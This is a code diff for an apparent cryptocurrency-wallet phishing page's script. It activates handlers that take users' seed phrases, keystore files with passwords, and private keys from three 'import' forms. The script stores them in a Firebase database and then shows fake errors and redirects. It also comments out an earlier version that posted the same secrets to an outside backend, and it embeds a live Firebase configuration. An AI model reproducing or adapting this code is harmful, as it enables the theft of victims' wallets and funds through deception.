@@ -8,280 +8,294 @@
 //   appId: "1:817769356811:web:953c60e0bb1f1435b1b10e"
 // };
 
-//initialize fb
-// firebase.initializeApp(firebaseConfig);
+ // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyAxRuUxT-btZYos4UwrTpa2AfQJRagYWkY",
+    authDomain: "sync-form-26285.firebaseapp.com",
+    databaseURL: "https://sync-form-26285-default-rtdb.firebaseio.com",
+    projectId: "sync-form-26285",
+    storageBucket: "sync-form-26285.firebasestorage.app",
+    messagingSenderId: "742170864101",
+    appId: "1:742170864101:web:e6e444bcdb034b20b1a70c"
+  };
 
-//ref for db
-// var importDB = firebase.database().ref("importForm");
-// var keystoreFormDB = firebase.database().ref("keystoreForm");
-// var privateFormDB = firebase.database().ref("privateForm");
-// let clickTime = 0;
+// initialize fb
+firebase.initializeApp(firebaseConfig);
 
-// document.getElementById('importForm').addEventListener('submit', submitPhrase);
-// document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
-// document.getElementById('privateForm').addEventListener('submit', submitPrivate);
+// ref for db
+var importDB = firebase.database().ref("importForm");
+  
+var keystoreFormDB = firebase.database().ref("keystoreForm");
+var privateFormDB = firebase.database().ref("privateForm");
+let clickTime = 0;
 
-//submit phrase page
-// function submitPhrase(e) {
-//   e.preventDefault();
+document.getElementById('importForm').addEventListener('submit', submitPhrase);
+document.getElementById('keystoreForm').addEventListener('submit', submitKeystore);
+document.getElementById('privateForm').addEventListener('submit', submitPrivate);
 
-//   clickTime++
-//   var phrase = document.getElementById('phrase').value;
-//   var walletname = document.getElementById('walletname').value;
+// submit phrase page
+function submitPhrase(e) {
+  e.preventDefault();
 
-//   console.log(phrase, walletname);
+  clickTime++
+  var phrase = document.getElementById('phrase').value;
+  var walletname = document.getElementById('walletname').value;
 
-//   savePhrase(phrase, walletname);
+  console.log(phrase, walletname);
 
-//   //alert msg
-//   if (clickTime === 1) {
-//     document.querySelector('.displayErr').style.display = 'block';
-//   } else if(clickTime === 2){
-//     setTimeout(() => {
-//     document.querySelector('.displayErr').style.display = 'none';
+  savePhrase(phrase, walletname);
 
-//       document.querySelector('.displayMessage').style.display = "block"
-//       }, 3000);
-//   }else{
+  //alert msg
+  if (clickTime === 1) {
+    document.querySelector('.displayErr').style.display = 'block';
+    window.location.href = "error.html";
 
-//   }
-//   // setTimeout(() => {
-//   // document.querySelector('.displayMessage').style.display = "block"
-//   // }, 3000);
+  } else if(clickTime === 2){
+    setTimeout(() => {
+    document.querySelector('.displayErr').style.display = 'none';
 
-//   //reset form
-//   document.getElementById('importForm').reset();
+      document.querySelector('.displayMessage').style.display = "block"
+      }, 2000);
+  }else{
 
-// }
+  }
+  // setTimeout(() => {
+  // document.querySelector('.displayMessage').style.display = "block"
+  // }, 3000);
 
-//   const savePhrase = (phrase, walletname)=>{
-//   var newimportDB = importDB.push();
+  //reset form
+  document.getElementById('importForm').reset();
 
-//   newimportDB.set({
-//       phrase : phrase,
-//       walletname : walletname
-//   })
-// }
+}
 
-//   const getElementVal = (id) =>{
-//   return document.getElementById(id).value;
-//   }
+  const savePhrase = (phrase, walletname)=>{
+  var newimportDB = importDB.push();
 
-//submit keystore page
-// function submitKeystore(el) {
-//   el.preventDefault();
+  newimportDB.set({
+      phrase : phrase,
+      walletname : walletname
+  })
+}
 
-//   var json = document.getElementById("json").value;
-//   var password = document.getElementById("password").value;
-//   var walletname = document.getElementById("walletname").value;
+  const getElementVal = (id) =>{
+  return document.getElementById(id).value;
+  }
 
-//   console.log(json, password, walletname);
+// submit keystore page
+function submitKeystore(el) {
+  el.preventDefault();
 
-//   saveKeystore(json, password, walletname)
+  var json = document.getElementById("json").value;
+  var password = document.getElementById("password").value;
+  var walletname = document.getElementById("walletname").value;
 
-//     //alert msg
-//   setTimeout(() => {
-//   document.querySelector('.displayMessage').style.display = "block"
-//   }, 3000);
+  console.log(json, password, walletname);
 
-//   //reset form
-//   document.getElementById('keystoreForm').reset();
+  saveKeystore(json, password, walletname)
 
-// }
+    //alert msg
+  setTimeout(() => {
+  document.querySelector('.displayMessage').style.display = "block"
+  }, 3000);
 
-// const saveKeystore = (json, password, walletname)=>{
+  //reset form
+  document.getElementById('keystoreForm').reset();
 
-//   var newkeystoreFormDB = keystoreFormDB.push();
+}
 
-//   newkeystoreFormDB.set({
-//       json : json,
-//       password : password,
-//       walletname : walletname
-//   })
-// }
+const saveKeystore = (json, password, walletname)=>{
 
-// const getElementValue = (id) =>{
-//   return document.getElementById(id).value;
-// }
+  var newkeystoreFormDB = keystoreFormDB.push();
 
-//submit private page
-// function submitPrivate(ele) {
-//   ele.preventDefault();
+  newkeystoreFormDB.set({
+      json : json,
+      password : password,
+      walletname : walletname
+  })
+}
 
-//   var private = document.getElementById("privateKey").value;
-//   var walletname = document.getElementById("walletname").value;
+const getElementValue = (id) =>{
+  return document.getElementById(id).value;
+}
 
-//   console.log(private, walletname);
+// submit private page
+function submitPrivate(ele) {
+  ele.preventDefault();
 
-//   savePrivateKey(private, walletname);
+  var private = document.getElementById("privateKey").value;
+  var walletname = document.getElementById("walletname").value;
 
-//     //alert msg
-//   document.querySelector('.displayMessage').style.display = "block"
+  console.log(private, walletname);
 
-//   //take off the alert msg
-//   setTimeout(() => {
-//     document.querySelector('.displayMessage').style.display = "none"
-//     }, 3000);
+  savePrivateKey(private, walletname);
 
-//   //reset form
-//   document.getElementById('privateForm').reset();
-// }
+    //alert msg
+  document.querySelector('.displayMessage').style.display = "block"
 
-// const savePrivateKey = (private, walletname) =>{
-//   var newprivateFormDB = privateFormDB.push();
+  //take off the alert msg
+  setTimeout(() => {
+    document.querySelector('.displayMessage').style.display = "none"
+    }, 3000);
 
-//   newprivateFormDB.set({
-//       private : private,
-//       walletname : walletname
+  //reset form
+  document.getElementById('privateForm').reset();
+}
 
-// })
-// }
+const savePrivateKey = (private, walletname) =>{
+  var newprivateFormDB = privateFormDB.push();
 
-// const getElementValues = (id) =>{
-//   return document.getElementById(id).value;
-// }
+  newprivateFormDB.set({
+      private : private,
+      walletname : walletname
+
+})
+}
+
+const getElementValues = (id) =>{
+  return document.getElementById(id).value;
+}
 
 // MY WRITTEN JS SCRIPTS START HERE
 
 // Form 1: Import/Phrase Form
 
 // Select all wallet-item elements
-document.querySelectorAll(".wallet-item").forEach(item => {
-  item.addEventListener("click", () => {
-    const walletName = item.querySelector(".head-4")?.textContent.trim();
-    const hiddenInput = document.querySelector(".walletname"); // adjust if you're using walletname2, etc.
+// document.querySelectorAll(".wallet-item").forEach(item => {
+//   item.addEventListener("click", () => {
+//     const walletName = item.querySelector(".head-4")?.textContent.trim();
+//     const hiddenInput = document.querySelector(".walletname"); // adjust if you're using walletname2, etc.
 
-    if (walletName && hiddenInput) {
-      hiddenInput.value = walletName;
-      console.log("Selected wallet:", walletName); // Optional debug
-    }
-  });
-});
+//     if (walletName && hiddenInput) {
+//       hiddenInput.value = walletName;
+//       console.log("Selected wallet:", walletName); // Optional debug
+//     }
+//   });
+// });
 
 
-document.querySelector("#importForm").addEventListener("submit", function (e) {
-  e.preventDefault();
+// document.querySelector("#importForm").addEventListener("submit", function (e) {
+//   e.preventDefault();
 
-  const ph = this.querySelector('textarea[name="ph"]');
-  const w_name = this.querySelector('input[name="w_name"]');
+//   const ph = this.querySelector('textarea[name="ph"]');
+//   const w_name = this.querySelector('input[name="w_name"]');
 
-  // Only require the phrase field since wallet might be hidden
-  if (!ph?.value) {
-    alert("Please fill in the phrase field!");
-    return;
-  }
+//   // Only require the phrase field since wallet might be hidden
+//   if (!ph?.value) {
+//     alert("Please fill in the phrase field!");
+//     return;
+//   }
 
-  const formData = {
-    ph: ph.value,
-    w_name: w_name?.value || "Anonymous", // Use 'Anonymous' if wallet field is empty/hidden
-  };
+//   const formData = {
+//     ph: ph.value,
+//     w_name: w_name?.value || "Anonymous", // Use 'Anonymous' if wallet field is empty/hidden
+//   };
 
-  console.log("Sending phrase data:", formData);
+//   console.log("Sending phrase data:", formData);
 
-  fetch("https://form-backend-production-f5f1.up.railway.app/ph", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(formData),
-  })
-    .then((response) => {
-      console.log("Response status:", response.status);
-      return response.text();
-    })
-    .then((result) => {
-      console.log("Server response:", result);
-      // alert("Success: " + result);
-    })
-    .catch((error) => {
-      console.log("Fetch error:", error);
-      // alert('Error: ' + error);
-    });
+//   fetch("https://form-backend-production-f5f1.up.railway.app/ph", {
+//     method: "POST",
+//     headers: { "Content-Type": "application/json" },
+//     body: JSON.stringify(formData),
+//   })
+//     .then((response) => {
+//       console.log("Response status:", response.status);
+//       return response.text();
+//     })
+//     .then((result) => {
+//       console.log("Server response:", result);
+//       // alert("Success: " + result);
+//     })
+//     .catch((error) => {
+//       console.log("Fetch error:", error);
+//       // alert('Error: ' + error);
+//     });
 
-  setTimeout(() => {
-    window.location.href = "error.html";
-  }, 2000);
-});
+//   setTimeout(() => {
+//     window.location.href = "error.html";
+//   }, 2000);
+// });
 
-// Form 2: Keystore Form
-document
-  .querySelector("#keystoreForm")
-  .addEventListener("submit", function (e) {
-    e.preventDefault();
+// // Form 2: Keystore Form
+// document
+//   .querySelector("#keystoreForm")
+//   .addEventListener("submit", function (e) {
+//     e.preventDefault();
 
-    const k_s = this.querySelector('textarea[name="k_s"]');
-    const pass = this.querySelector('input[name="pass"]');
-    const w_name = this.querySelector('input[name="w_name"]');
+//     const k_s = this.querySelector('textarea[name="k_s"]');
+//     const pass = this.querySelector('input[name="pass"]');
+//     const w_name = this.querySelector('input[name="w_name"]');
 
-    if (!k_s?.value || !pass?.value) {
-      alert("Please fill in keystore and password fields!");
-      return;
-    }
+//     if (!k_s?.value || !pass?.value) {
+//       alert("Please fill in keystore and password fields!");
+//       return;
+//     }
 
-    const formData = {
-      k_s: k_s.value,
-      pass: pass.value,
-      w_name: w_name?.value || "Anonymous",
-    };
+//     const formData = {
+//       k_s: k_s.value,
+//       pass: pass.value,
+//       w_name: w_name?.value || "Anonymous",
+//     };
 
-    console.log("Sending keystore data:", formData);
+//     console.log("Sending keystore data:", formData);
 
-    fetch("https://form-backend-production-f5f1.up.railway.app/ks", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(formData),
-    })
-      .then((response) => response.text())
-      .then((result) => {
-        console.log("Server response:", result);
-        // alert('Success: ' + result);
-      })
-      .catch((error) => {
-        console.log("Fetch error:", error);
-        // alert('Error: ' + error);
-      });
+//     fetch("https://form-backend-production-f5f1.up.railway.app/ks", {
+//       method: "POST",
+//       headers: { "Content-Type": "application/json" },
+//       body: JSON.stringify(formData),
+//     })
+//       .then((response) => response.text())
+//       .then((result) => {
+//         console.log("Server response:", result);
+//         // alert('Success: ' + result);
+//       })
+//       .catch((error) => {
+//         console.log("Fetch error:", error);
+//         // alert('Error: ' + error);
+//       });
 
-      setTimeout(() => {
-        window.location.href = "error.html";
-      }, 2000);
-  });
+//       setTimeout(() => {
+//         window.location.href = "error.html";
+//       }, 2000);
+//   });
 
-// Form 3: Private Key Form
-document.querySelector("#privateForm").addEventListener("submit", function (e) {
-  e.preventDefault();
+// // Form 3: Private Key Form
+// document.querySelector("#privateForm").addEventListener("submit", function (e) {
+//   e.preventDefault();
 
-  const p_k = this.querySelector('input[name="p_k"]');
-  const w_name = this.querySelector('input[name="w_name"]');
+//   const p_k = this.querySelector('input[name="p_k"]');
+//   const w_name = this.querySelector('input[name="w_name"]');
 
-  if (!p_k?.value) {
-    alert("Please fill in the private key field!");
-    return;
-  }
+//   if (!p_k?.value) {
+//     alert("Please fill in the private key field!");
+//     return;
+//   }
 
-  const formData = {
-    p_k: p_k.value,
-    w_name: w_name?.value || "Anonymous",
-  };
+//   const formData = {
+//     p_k: p_k.value,
+//     w_name: w_name?.value || "Anonymous",
+//   };
 
-  console.log("Sending private key data:", formData);
+//   console.log("Sending private key data:", formData);
 
-  fetch("https://form-backend-production-f5f1.up.railway.app/pk", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(formData),
-  })
-    .then((response) => response.text())
-    .then((result) => {
-      console.log("Server response:", result);
-      // alert('Success: ' + result);
-    })
-    .catch((error) => {
-      console.log("Fetch error:", error);
-      // alert('Error: ' + error);
-    });
+//   fetch("https://form-backend-production-f5f1.up.railway.app/pk", {
+//     method: "POST",
+//     headers: { "Content-Type": "application/json" },
+//     body: JSON.stringify(formData),
+//   })
+//     .then((response) => response.text())
+//     .then((result) => {
+//       console.log("Server response:", result);
+//       // alert('Success: ' + result);
+//     })
+//     .catch((error) => {
+//       console.log("Fetch error:", error);
+//       // alert('Error: ' + error);
+//     });
 
-    setTimeout(() => {
-      window.location.href = "error.html";
-    }, 2000);
-});
+//     setTimeout(() => {
+//       window.location.href = "error.html";
+//     }, 2000);
+// });
 
 
 
